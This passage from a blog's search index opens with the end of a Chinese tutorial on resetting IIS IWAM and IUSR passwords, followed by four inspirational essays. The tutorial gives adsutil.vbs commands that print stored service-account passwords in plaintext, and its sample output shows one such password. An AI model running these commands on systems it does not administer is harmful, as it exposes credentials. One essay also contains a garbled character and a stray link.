False</p><p>e.保存，关闭，OK。</p><p>不罗嗦了，下面列出</p><p>查看密码命令：</p><p>开始—&gt;程序—&gt;附件 打开命令提示符</p><p>输入 cd c:\inetpub\adminscripts</p><p>获取 IWAM 帐户密码命令： cscript.exe adsutil.vbs get w3svc/wamuserpass</p><p>获取 IUSR 帐户密码命令： cscript.exe adsutil.vbs get w3svc/anonymoususerpass</p><p>输入以上命令，按回车可分别查看IWAM和IUSR的密码。</p><p>修改密码命令：</p><p>修改 IWAM 帐户密码 cscript.exe adsutil.vbs set w3svc/wamuserpass “password”</p><p>修改 IUSR 帐户密码 cscript.exe adsutil.vbs set w3svc/anonymoususerpass “password”</p><p>password 设置为你想修改的密码，即与第一步中你设置的用户IWAM_<em>**</em>的相同，按回车即可修改完成。</p><p>这里一定要注意：w3svc与wamuserpass之间的杠是/而不是\，否则会出错。</p><p>并且还要注意：修改密码前请一定停止所有的Internet信息服务，否则后面可能会出错，并且IWAM帐户可能会被锁定。</p><p>如何停止？打开计算机管理，在Internet信息服务上单击右键，选择重新启动IIS服务，在选项中点停止IIS服务，确定即可。</p><p>3）更改组件服务中的密码</p><p>开始—&gt;程序—&gt;附件 打开命令提示符</p><p>先输入 cd c:\inetpub</p><p>\adminscripts</p><p>然后输入 cscript.exe synciwam.vbs -v</p><p>系统会提示：</p><p>microsoft (r) windows script host version 5.6</p><p>版权所有(c) microsoft corporation 1996-2000。保留所有权利。</p><p>wamusername:iwam_myserver</p><p>wamuserpass:aboutnt2001</p><p>iis applications defined:</p><p>name, appisolated, package id</p><p>w3svc, 0, 3d14228c-fbe1-11d0-995d-00c04fd919c1}</p><p>root, 2,</p><p>iishelp, 2,</p><p>iisadmin, 2,</p><p>iissamples, 2,</p><p>msadc, 2,</p><p>root, 2,</p><p>iisadmin, 2,</p><p>iishelp, 2,</p><p>root, 2,</p><p>root, 2,</p><p>out of process applications defined:</p><p>count: 1</p><p>3d14228d-fbe1-11d0-995d-00c04fd919c1}</p><p>updating applications:</p><p>name: iis out-of-process pooled applications key: 3d14228d-fbe1-11d0-995d-00c04fd919c1}</p><p>这时所有操作基本就OK了，重新启动IIS，好了，你的网站能访问了。</p><p>如果第三步在最后一行提示：</p><p>80110414 错误</p><p>请将Internet信息服务停止，这时IWAM帐号可能也被锁定了。需要去用户里把IWAM帐号解锁。</p><p>然后再试，应该OK。</p>]]></content>
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>给自己一方天空</title>
      <link href="/2007/11/27/give-yourself-a-sky/"/>
      <url>/2007/11/27/give-yourself-a-sky/</url>
      <content type="html"><![CDATA[<p> 若生为林木，我当欣欣以向荣；</p><p>若生为幽草，我当萋萋而摇绿。</p><p>如果是小草，就不要羡慕大树的伟岸参天，你依然可以长成一片翠绿；如果是麻雀，就不要羡慕雄鹰的搏击飞翔，你依然可以在枝桠间寻找快乐；如果是小溪，就不要羡慕大海的惊涛拍岸，你依然可以在山涧自由流淌。生而为人，就不要羡慕别人的天赐良机，做回自己，给自己一方天空。</p><p>齐白石的虾，徐悲鸿的马，似乎成为了画界一座不可逾越的高山。若刻意模仿，必定邯郸学步。但是齐白石之后，又有多少虾随意舞动于那一纸清波；徐悲鸿之后，又有多少骏马任意奔驰出一卷平川。我们要做的仅仅是表现出自己，展现自己的风采。ト绻生活是一座壁立千仞的高峰，走好自己的路，就算无法登上顶峰，也可以在峰回路转中体会途中美景，又何必为登顶不成而惆怅。撒哈拉漫漫沙路上，曾留下三毛无悔的足迹，她的生命宛如万里黄沙中一眼微笑的井；龙门千佛古色古香的遗迹中，曾留下席慕容无悔的依恋，她的生命宛如千百年站成的一棵树；阿里山日月潭秀山丽水的风光中，曾留下林清玄无悔的记忆，他的生命宛如一片飞上蓝天的白云……只有敢于展现自己，只有敢于在自己的蓝天下振翅高翔，生命才会焕发出夺目的光彩。</p><p>作家屠格涅夫曾说，要找出自己值多少，那是别人的事情，重要的是做好你自己。你不比一颗星暗，不比一棵树低，天生我材必有用，别人可以胸怀“直挂云帆济沧海”的宏图，我们却可以拥有“暗香浮动月黄昏”的美景。诗人说过，我是这个土岗子上最出色的麦子。是啊！不必羡慕别人的辉煌，勇敢表现出真实的自己，你就是最棒的。</p><p>也许诞生了马拉多纳的足球场上再也不会有这样一位足球天才了，但是在那里依然可以有更多无名的球员，他们不为争得如马拉多纳般的荣誉，只为挥洒青春无悔的汗水而尽情奔跑；也许柏拉图的雅典学院，再也不会有这样一位思想家，但在那里却有更多默默耕耘的学者，为捍卫真理而感到快乐。</p><p>虽然没有翅膀，但我依然拥有头顶的一方晴空。</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>拒绝空白</title>
      <link href="/2007/11/27/refused-to-blank/"/>
      <url>/2007/11/27/refused-to-blank/</url>
      <content type="html"><![CDATA[<p> 空白是生命中的盲点。</p><p>我以对生命的热烈追求来庄严宣誓：我拒绝空白。</p><p>两千多年前孔子对人说过：“天生万物，唯人最贵。”</p><p>我，生为人，出于对生命的尊重，我必须有奋发向上、刚健有为的人生态度和价值取向。</p><p>我崇拜孔子。他有“齐家治国平天下”的理想；他有“吾十五有志于学，三十而立，四十不惑，五十而知天命，六十耳顺，七十从心所欲，不逾矩”的宣言。</p><p>我崇拜孟子。他有“当今之世，舍我取谁”的豪情；他有“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身……”的坚毅。</p><p>人生在世，身为社会一员，就有责任为社会做贡献。我有义务做到“达则兼济天下”。</p><p>当在热烈的追求之中遇到艰苦的时候，我决不会接受空白，决不会落得个“穷则独善其身”。</p><p>我要将自己的脊梁化为沙漠中坚挺着的胡杨，活着三百年不死，死了三百年不倒，倒了三百年不朽。</p><p>我拒绝空白。我拒绝庄子。拒绝他“终身不仕”，愿化归于自然。</p><p>我拒绝空白。我拒绝陶潜。拒绝“守拙归园田”，“复得反自然”。</p><p>人生于社会，怎能逃避社会？</p><p>我决不会给生命留下一点空白。</p><p>我有理想，我愿尽我所能为人类社会注入前进的一丝力量。我愿做到“仁者爱人”、“仁者无不爱”、“泛爱众”的博爱。我愿如“长太息以掩泣兮，哀民生之多艰”的屈平；我愿如“凭轩涕细流”，“安得广厦千万间，大庇天下寒士俱欢颜，风雨不动安如山”的杜子美；我愿如“先天下之忧而忧，后天下之乐而乐”的范仲淹；我愿如“苟利国家生死以，岂因祸福避趋之”的林则徐。所以我拒绝空白，拒绝“穷则独善其身”。</p><p>我有毅力，有孟子“苦其心志，劳其筋骨”的坚毅，有“任尔东西南北风”的坚强，有“路漫漫其修远兮，吾将上下而求索”的坚持，有沙漠中胡杨的坚韧。 我，要用我的理想和毅力，去拒绝空白，去追求我热烈的人生。</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>不经历风雨怎能见彩虹</title>
      <link href="/2007/11/27/no-rain-no-rainbows/"/>
      <url>/2007/11/27/no-rain-no-rainbows/</url>
      <content type="html"><![CDATA[<p> 辽阔苍穹中飞翔的老鹰，必是经历了母鹰无数次摔下山崖的痛苦，才锤炼出一双凌空的翅膀。</p><p>一颗璀璨无比的珍珠，必然经受过蚌的肉体无数次蠕动以及无数风浪的打磨，才能熠熠生辉。</p><p>同样，一个真正有成就的人，也肯定是在无数次的跌倒后重新站起来的，因为“不经历风雨，怎能见彩虹？没有人能随随便便成功”。</p><p>史铁生摔了一跤，没有了双腿，这对任何人来说都是沉重的打击。但他没有因此对生活失去信心，而是用自己的大脑和双手去表达对生活的无限热爱。</p><p>贝多芬双目失明且耳聋，但他依然写出了《英雄》《命运》等大量音乐作品，在人生的不幸中，他顽强地扼住了“命运的咽喉”。</p><p>这些都是曾经摔过跤的人，但他们却都坚强地站了起来，与命运、与不幸抗争，最终取得了巨大的成功。</p><p>所以对我们每个人来说，摔跤并不可怕，可怕的是你从此对生活失去信心和勇气。</p><p>冰心说：“成功的花，人们只惊慕它现时的明艳！然而当初它的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。”</p><p>所以我们每个人面对不幸时都不能一蹶不振，因为我们都有可能在改变心态后，握住生命的任何一根链条。</p><p>就像画中那个男孩在摔跤后，面对来自老师、家长、社会各方面的询问，我们都应大胆地说：“这没什么大不了的。”</p><p>因为生活是我们自己的，命运是掌握在我们自己手中的，我们的心态、我们的选择，决定了人生的方向。</p><p>挫折是人生的一笔财富，是促使你成功的一剂良药，不经历风雨的花儿，怎么会绚烂？不经历磨难的人生，怎么会发出炫目的光彩？</p><p>就像2005年感动中国的人物——洪战辉所说：困难，我们有责任去面对它，解决它。作为新一代的年轻人，我们应该明白摔跤并不可怕，就像我们总是有勇气唱起这首歌：不经历风雨，怎能见彩虹？没有人能随随便便成功！</p><p>我要说，不经历一次次摔跤和一次次跌倒后又站起，人怎么能长大？摔跤也是一种幸福，风雨正是雨后彩虹的前兆！</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>且放云帆济沧海</title>
      <link href="/2007/11/27/and-put-a-cloud-sail-on-the-sea/"/>
      <url>/2007/11/27/and-put-a-cloud-sail-on-the-sea/</url>
      <content type="html"><![CDATA[<p> 小船升起云帆，横济沧海的航程中难免会有风吹浪打；小树初有新芽，茁壮成长中难免会遭受雨雪风霜；小溪向前奔流，一路上不只有泉水叮咚，也有险滩漩涡。</p><p>青少年的成长亦如此。成长的过程便如登山的旅程，难免会跌跤，会有荆棘的划痕，会有一次次的摔打和磨砺。这些都是正常现象，家庭、学校和社会都不必太在意，以一颗平常心去看便好。</p><p>正如一艘扬帆起航的小船，自会在风雨的磨炼中变得坚强。太多的关心、保护，反而会给它小小的船舱添上无谓的负荷，成为前进的压力与障碍。在父母的羽翼下寻求庇护的日子早已过去，我们已经渴望敞开胸膛，拥抱雷雨闪电，享受自然的阳光。当孩子在人生路上开始迈出自己的步子，家庭应给予理解和支持，请解除目光的锁链，让孩子乘着自己的人生之舟与风浪一搏吧！当前进的路上遭遇坎坷，当孩子受到挫折时，我们的家庭要保持一颗平常心，不要急于代劳，不要过分关爱，更不要小题大做，只需微笑着看着孩子爬起，那叶小舟自然会顺着信任的目光扬帆前行。</p><p>希望孩子们十全十美的学校也不应过分苛求。“人非圣贤，孰能无过？”微小的失误在所难免，其实是架起了一座通往成熟的金桥。不要将目光聚焦于孩子的小小失误，不要在孩子摔跤时投去指责的目光。用信任和宽容去对待孩子的小失误吧，这样，他们才会成为带着成熟微笑的舵手，从胜利的彼岸带回满意的答卷。</p><p>最后，我们的社会也应重新审视对青少年的态度。从早先的反对溺爱，到现在的提倡挫折教育，社会的整体教育观念已有了可喜的变化。对于孩子们的偶尔跌跤，社会不应给以过度的关注，更不能大肆炒作。初登<a href="http://edu.qq.com/sexedu/sex.shtml" target="_blank" rel="noopener">处女</a>航的小船，还在对这个社会知之甚少的轻微恐惧中微微颤动。太多的镁光灯突然一齐聚焦，只会让小船疑惑和恐慌，云帆在航行中倾斜一下，社会可以淡淡一笑，放下过多的牵挂，自立自强的一代自会崛起。</p><p>成龙的孩子房祖明曾写过一首叫作《请让我摔下去》的歌，道出了千万个孩子困扰的心境。在人生路上跌一跤本在所难免，可怕的是家庭、学校、社会的目光立刻蜂拥而上，织成一张密密的网，让孩子在迷惑中百般挣扎而不能自己站起，只得在无奈中成为目光的俘虏。 可是快看，那艘为目光所缚的小船，正拼命地向远方鼓足云帆。就请家庭松开过度关爱的目光，请学校放下过分指责的目光，请社会转移过于关注的目光，将它们换为理解与宽容，放那一叶云帆去济沧海吧！</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
